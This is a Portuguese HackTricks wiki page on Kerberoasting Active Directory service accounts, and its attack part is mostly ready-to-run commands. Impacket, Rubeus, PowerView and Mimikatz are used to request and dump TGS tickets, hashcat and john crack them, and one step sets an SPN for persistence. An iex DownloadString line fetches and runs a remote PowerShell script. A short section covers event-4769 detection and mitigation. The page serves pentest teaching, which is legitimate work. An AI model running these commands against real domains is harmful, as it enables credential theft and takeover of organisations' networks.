# Kerberoast

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Kerberoast

O Kerberoasting foca na aquisição de **tickets TGS**, especificamente aqueles relacionados a serviços operando sob **contas de usuário** no **Active Directory (AD)**, excluindo **contas de computador**. A criptografia desses tickets utiliza chaves que se originam das **senhas de usuário**, permitindo a possibilidade de **quebra offline de credenciais**. O uso de uma conta de usuário como serviço é indicado por uma propriedade **"ServicePrincipalName"** não vazia.

Para executar o **Kerberoasting**, uma conta de domínio capaz de solicitar **tickets TGS** é essencial; no entanto, esse processo não exige **privilégios especiais**, tornando-o acessível a qualquer pessoa com **credenciais de domínio válidas**.

### Pontos Chave:

* O **Kerberoasting** visa os **tickets TGS** para **serviços de contas de usuário** dentro do **AD**.
* Tickets criptografados com chaves de **senhas de usuário** podem ser **quebrados offline**.
* Um serviço é identificado por um **ServicePrincipalName** que não é nulo.
* **Nenhum privilégio especial** é necessário, apenas **credenciais de domínio válidas**.

### **Ataque**

{% hint style="warning" %}
As **ferramentas de Kerberoasting** geralmente solicitam **`criptografia RC4`** ao realizar o ataque e iniciar solicitações TGS-REQ. Isso ocorre porque o **RC4 é** [**mais fraco**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) e mais fácil de quebrar offline usando ferramentas como Hashcat do que outros algoritmos de criptografia, como AES-128 e AES-256.\
Os hashes RC4 (tipo 23) começam com **`$krb5tgs$23$*`** enquanto os AES-256 (tipo 18) começam com **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Ferramentas com várias funcionalidades, incluindo um dump de usuários que podem ser alvos de Kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Enumerar usuários vulneráveis ao ataque Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Técnica 1: Solicitar o TGS e despejá-lo da memória**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Técnica 2: Ferramentas automáticas**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Quando um TGS é solicitado, o evento do Windows `4769 - Um ticket de serviço Kerberos foi solicitado` é gerado.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) para construir facilmente e **automatizar fluxos de trabalho** com base nas ferramentas comunitárias **mais avançadas do mundo**.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### Quebra
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistência

Se você tiver **permissões suficientes** sobre um usuário, você pode **torná-lo passível de kerberoast**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Pode encontrar **ferramentas** úteis para ataques de **kerberoast** aqui: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Se encontrar este **erro** no Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** é devido à hora local, precisa de sincronizar o host com o DC. Existem algumas opções:

* `ntpdate <IP do DC>` - Descontinuado a partir do Ubuntu 16.04
* `rdate -n <IP do DC>`

### Mitigação

O Kerberoasting pode ser realizado com um alto grau de furtividade se for explorável. Para detetar esta atividade, deve-se prestar atenção ao **Security Event ID 4769**, que indica que um ticket Kerberos foi solicitado. No entanto, devido à alta frequência deste evento, filtros específicos devem ser aplicados para isolar atividades suspeitas:

* O nome do serviço não deve ser **krbtgt**, pois esta é uma solicitação normal.
* Os nomes de serviço que terminam com **$** devem ser excluídos para evitar incluir contas de máquinas usadas para serviços.
* As solicitações de máquinas devem ser filtradas excluindo nomes de contas formatados como **máquina@domínio**.
* Apenas as solicitações de ticket bem-sucedidas devem ser consideradas, identificadas por um código de falha de **'0x0'**.
* **Mais importante ainda**, o tipo de criptografia do ticket deve ser **0x17**, que é frequentemente usado em ataques de Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Para mitigar o risco de Kerberoasting:

- Certifique-se de que as **Senhas de Contas de Serviço são difíceis de adivinhar**, recomendando um comprimento de mais de **25 caracteres**.
- Utilize **Contas de Serviço Gerenciadas**, que oferecem benefícios como **alterações automáticas de senha** e **gerenciamento delegado de Service Principal Name (SPN)**, aumentando a segurança contra tais ataques.

Ao implementar essas medidas, as organizações podem reduzir significativamente o risco associado ao Kerberoasting.

## Kerberoast sem conta de domínio

Em **setembro de 2022**, uma nova maneira de explorar um sistema foi revelada por um pesquisador chamado Charlie Clark, compartilhada por meio de sua plataforma [exploit.ph](https://exploit.ph/). Este método permite a aquisição de **Service Tickets (ST)** por meio de uma solicitação **KRB\_AS\_REQ**, o que não exige controle sobre nenhuma conta do Active Directory. Essencialmente, se um principal estiver configurado de tal forma que não exija pré-autenticação - um cenário semelhante ao que é conhecido no mundo da cibersegurança como um ataque de **AS-REP Roasting** - essa característica pode ser aproveitada para manipular o processo de solicitação. Especificamente, ao alterar o atributo **sname** dentro do corpo da solicitação, o sistema é enganado para emitir um **ST** em vez do Ticket Granting Ticket (TGT) criptografado padrão.

A técnica é totalmente explicada neste artigo: [post do blog Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Você deve fornecer uma lista de usuários, pois não temos uma conta válida para consultar o LDAP usando essa técnica.
{% endhint %}

#### Linux

- [impacket/GetUserSPNs.py do PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus do PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Referências

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas **ferramentas comunitárias mais avançadas do mundo**.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
